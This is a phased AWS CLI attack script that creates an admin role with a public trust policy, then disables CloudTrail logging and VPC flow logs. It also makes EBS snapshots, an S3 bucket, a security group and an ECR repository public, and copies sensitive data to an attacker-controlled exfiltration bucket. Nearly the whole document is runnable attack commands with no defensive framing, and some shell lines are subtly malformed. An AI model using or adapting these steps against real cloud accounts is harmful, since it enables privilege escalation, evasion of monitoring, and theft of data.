# Create Vars

export TARGET_AWS_ACCOUNT=1234567890
export TARGET_REGION=us-west-2
export ATTACKER_ROLE_NAME=Attacker-Role
export PERMISSIONS_BOUNDARY=BoundaryForAdministratorAccess
export ATTACKER_ROLE_POLICY_PATH=admin-policy.json
export ATTACKER_ROLE_TRUST_POLICY_PATH=trust-policy.json
export TARGET_BUCKET=my-bucket-name
export EXFIL_BUCKET=exfil-bucket-name
export TARGET_SECURITY_GROUP=my-security-group
export TARGET_ECR_REPOSITORY=my-ecr-repo
export ECR_POLICY_PATH=ecr-policy.json

# Phase 1 - Exploit a Leak

## Create Role, Apply Inline Admin Policy and Make AssumeRole Public
aws iam create-role --role-name $ATTACKER_ROLE_NAME --permissions-boundary $PERMISSIONS_BOUNDARY
aws iam put-role-policy --role-name $ATTACKER_ROLE_NAME --policy-name AdminPolicy --policy-document $ATTACKER_ROLE_POLICY_PATH
aws iam update-assume-role-policy --role-name $ATTACKER_ROLE_NAME --policy-document $ATTACKER_ROLE_TRUST_POLICY_PATH

## Confirm Role Creation
aws iam get-role --role-name $ATTACKER_ROLE_NAME
aws iam list-role-policies --role-name $ATTACKER_ROLE_NAME
ATTACKER_ROLE_ARN=$(aws iam get-role --role-name $ATTACKER_ROLE_NAME | jq -r '.Role.Arn')

## Assume the new Role
aws sts assume-role --role-arn $ATTACKER_ROLE_ARN --role-session-name HarmlessSession


# Phase 2 - Reduce Visibility

## Disable CloudTrail logging
$TRAIL=$(aws cloudtrail list-trails --region $TARGET_REGION | jq -r '.Trails.Name')
aws cloudtrail stop-logging --name $TRAIL

## Disable GuardDuty Monitoring

## Disable VPC flow logs
$FLOW_LOG_ID=$(aws ec2 describe-flow-logs | jq -r '.FlowLogs.FlowLogId')
aws ec2 delete-flow-logs --flow-log-id $FLOW_LOG_ID

## Disable S3 Bucket access logging
aws s3api delete-bucket-policy --bucket $TARGET_BUCKET


# Phase 3 - Mass Exposure

## EBS snapshot modified to share publicly
$SNAPSHOTS=$(aws ec2 describe-snapshots --owner-ids self --query "Snapshots[*].{ID:SnapshotId}")
jq -c '.[]' $SNAPSHOTS | while read i; do
    aws ec2 modify-snapshot-attribute --snapshot-id $i --attribute createVolumePermission --operation-type add --group-names all
done

## S3 bucket made public through policy
aws s3api delete-public-access-block --bucket $TARGET_BUCKET

## EC2 security group modified to allow ingress and egress from/to the public internet
aws ec2 authorize-security-group-ingress --group-id $TARGET_SECURITY_GROUP --protocol tcp --port 80 --cidr 0.0.0.0/0
aws ec2 authorize-security-group-egress --group-id $TARGET_SECURITY_GROUP --protocol all --port 0-65535 --cidr 0.0.0.0/0

## ECR repository policy modified to allow public access
aws ecr delete-repository-policy --repository-name $TARGET_ECR_REPOSITORY
aws ecr set-repository-policy --repository-name $TARGET_ECR_REPOSITORY --policy-text $ECR_POLICY_PATH

# Phase 4 - The Steal

## SSH Into Host and aws cp out to exfil data
aws s3 cp --recursive ./sensitive-data s3://$EXFIL_BUCKET 
